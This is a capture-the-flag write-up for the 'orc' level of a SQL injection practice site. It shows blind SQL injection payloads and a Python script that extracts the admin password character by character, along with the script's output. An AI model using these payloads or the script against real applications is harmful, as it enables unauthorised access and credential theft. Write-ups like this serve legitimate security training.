---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 4
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/3fb3ba7d-5c3a-40cc-8b3a-8dcd16ebe014)

We are provided with the SQL query:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='{$_GET[pw]}'
```

The code performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the following message: `Hello admin`
2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.


In order to print out the flag, we need to first know the password. For that we have to perform a Blind SQL Injection.

## Blind SQL Injection

First we have to reveal the length of the flag.

### Retrieving the password length

If we provide the following URI parameter:

```
?pw=' OR id='admin' AND length(pw)=1 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=1 -- -'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=1

## Commented part:
'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/d0e5928c-c2a2-4355-a6a2-af11d1804556)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
That tells us that the length of the `pw` column is more than 1.

If we keep increasing the length and provide the following URI parameter:

```
?pw=' OR id='admin' AND length(pw)=8 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8 -- -'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8

## Commented part:
'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/9e438378-10e1-4f7a-9353-bdf75700825d)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the length of the `pw` column is 8.

### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

![4](https://github.com/Kunull/Write-ups/assets/110326359/e332b358-2371-4f97-a9be-e1e5afce6f68)

If we provide the following URI parameter:

```
?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)='0' -- -'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)='0'

## Commented part:
'
```

![5](https://github.com/Kunull/Write-ups/assets/110326359/d479be75-0818-47a3-8d89-991e9dcd1926)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the first character of the `pw` for `id=admin` is `0`.

We can now move onto the second character:

```
?pw=' OR id='admin' AND substr(pw, 2, 1)='0' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='0' -- -'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='0'

## Commented part:
'
```

![6](https://github.com/Kunull/Write-ups/assets/110326359/557a333a-920a-485b-926b-e87bfbf8b8f4)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
That tells us that the second character of the `pw` for `id=admin` is not `0`.

We can try other characters moving up to the following:

```
?pw=' OR id='admin' AND substr(pw, 2, 1)='9' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='9' -- -'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='9'

## Commented part:
'
```

![7](https://github.com/Kunull/Write-ups/assets/110326359/e9d938ad-34aa-4f07-8e9b-167b5d1ec34d)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the second character of the `pw` for `id=admin` is `9`.

We can keep repeating this process until we get all the eight characters of the `admin` password:

```
095a9852
```

### Script

We can automate the entire process using a script.

```py title="orc_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'jkvees84mr4jq3nallg9rum7he'}
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
password_length = 0

for x in range(0, 10):
  payload = f"' OR id='admin' AND length(pw)={x} -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' OR id='admin' AND substr(pw, {index}, 1)='{char}' -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\orc_script.py

[!] Payload: ?pw=' OR id='admin' AND length(pw)=8 -- -
[!] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+length%28pw%29%3D8+--+-
[!] Password length: 8

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+1%2C+1%29%3D%270%27+--+-
[+] Character at index 1: 0

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 2, 1)='9' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+2%2C+1%29%3D%279%27+--+-
[+] Character at index 2: 9

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 3, 1)='5' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+3%2C+1%29%3D%275%27+--+-
[+] Character at index 3: 5

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 4, 1)='a' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+4%2C+1%29%3D%27a%27+--+-
[+] Character at index 4: a

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 5, 1)='9' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+5%2C+1%29%3D%279%27+--+-
[+] Character at index 5: 9

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 6, 1)='8' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+6%2C+1%29%3D%278%27+--+-
[+] Character at index 6: 8

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 7, 1)='5' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+7%2C+1%29%3D%275%27+--+-
[+] Character at index 7: 5

[+] Payload: ?pw=' OR id='admin' AND substr(pw, 8, 1)='2' -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+8%2C+1%29%3D%272%27+--+-
[+] Character at index 8: 2

[!] Extracted password: 095a9852
[!] Final payload: ?pw=095a9852
```

Now, we can provide password URI parameter:

```
?pw=095a9852
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='095a9852'
```

![8](https://github.com/Kunull/Write-ups/assets/110326359/ef9ae213-af29-4450-8d2e-34d02565e928)
